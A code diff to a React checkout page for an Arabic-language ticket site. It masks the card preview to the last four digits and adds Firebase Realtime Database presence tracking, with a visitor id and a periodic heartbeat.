@@ -2,6 +2,13 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { AlertCircle, Check, CreditCard, Loader2, ShieldCheck } from "lucide-react";
 import { doc, onSnapshot } from "firebase/firestore";
 import {
+  onDisconnect,
+  onValue,
+  ref as databaseRef,
+  serverTimestamp,
+  set as setRealtimeValue,
+} from "firebase/database";
+import {
   QuestLegalFooter,
   QuestMobileTopBar,
   SessionTimerStrip,
@@ -13,7 +20,7 @@ import {
   getStoredTicketCart,
   ticketProductMap,
 } from "@/lib/ticket-cart";
-import { addData, db } from "@/lib/firebase";
+import { addData, database, db } from "@/lib/firebase";
 
 interface BillingDetails {
   firstName: string;
@@ -193,6 +200,15 @@ function normalizeCardNumber(value: string): string {
   return toDigitsOnly(value).slice(0, 19);
 }
 
+function getCardPreviewNumber(value: string): string {
+  const digits = toDigitsOnly(value);
+  if (digits.length < 4) {
+    return "•••• •••• •••• ••••";
+  }
+
+  return `•••• •••• •••• ${digits.slice(-4)}`;
+}
+
 function generateSubmissionId(existingSubmissionId: string | null): string {
   if (typeof window !== "undefined") {
     const storedVisitorId = window.localStorage.getItem("visitor");
@@ -210,6 +226,21 @@ function generateSubmissionId(existingSubmissionId: string | null): string {
   }
 
   return `pay-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
+}
+
+function ensureVisitorId(): string {
+  if (typeof window === "undefined") {
+    return `visitor-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  }
+
+  const existing = window.localStorage.getItem("visitor");
+  if (existing) {
+    return existing;
+  }
+
+  const generated = `visitor-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  window.localStorage.setItem("visitor", generated);
+  return generated;
 }
 
 function validateBillingDetails(billing: BillingDetails): string | null {
@@ -278,6 +309,7 @@ export default function Checkout() {
   const otpVerifyTimerRef = useRef<number | null>(null);
   const otpInputRef = useRef<HTMLInputElement>(null);
   const webOtpAbortRef = useRef<AbortController | null>(null);
+  const visitorPresenceId = useMemo(() => ensureVisitorId(), []);
 
   const storedOrderItems = useMemo(
     () => buildTicketOrderItems(storedCart.quantities),
@@ -298,7 +330,7 @@ export default function Checkout() {
     ? formatArabicDate(visitDate)
     : "غير محدد";
   const visitTime = storedCart.visitTime ?? "١٧:٣٠ - ٢٣:٥٩";
-  const cardPreviewNumber = cardDetails.cardNumber || "•••• •••• •••• ••••";
+  const cardPreviewNumber = getCardPreviewNumber(cardDetails.cardNumber);
   const cardPreviewName =
     cardDetails.cardholderName.trim() || "اسم حامل البطاقة";
   const cardPreviewExpiry = cardDetails.expiry || "MM/YY";
@@ -317,6 +349,51 @@ export default function Checkout() {
       }
     };
   }, []);
+
+  useEffect(() => {
+    const presenceRef = databaseRef(database, `presence/${visitorPresenceId}`);
+    const connectedRef = databaseRef(database, ".info/connected");
+
+    const unsubscribe = onValue(connectedRef, (snapshot) => {
+      if (snapshot.val() !== true) {
+        return;
+      }
+
+      void onDisconnect(presenceRef).set({
+        online: false,
+        currentPage: "checkout",
+        submissionId: submissionId ?? visitorPresenceId,
+        lastSeen: serverTimestamp(),
+      });
+
+      void setRealtimeValue(presenceRef, {
+        online: true,
+        currentPage: "checkout",
+        submissionId: submissionId ?? visitorPresenceId,
+        lastSeen: serverTimestamp(),
+      });
+    });
+
+    const heartbeat = window.setInterval(() => {
+      void setRealtimeValue(presenceRef, {
+        online: true,
+        currentPage: "checkout",
+        submissionId: submissionId ?? visitorPresenceId,
+        lastSeen: serverTimestamp(),
+      });
+    }, 20000);
+
+    return () => {
+      window.clearInterval(heartbeat);
+      unsubscribe();
+      void setRealtimeValue(presenceRef, {
+        online: false,
+        currentPage: "checkout",
+        submissionId: submissionId ?? visitorPresenceId,
+        lastSeen: serverTimestamp(),
+      });
+    };
+  }, [submissionId, visitorPresenceId]);
 
   useEffect(() => {
     if (!submissionId) {
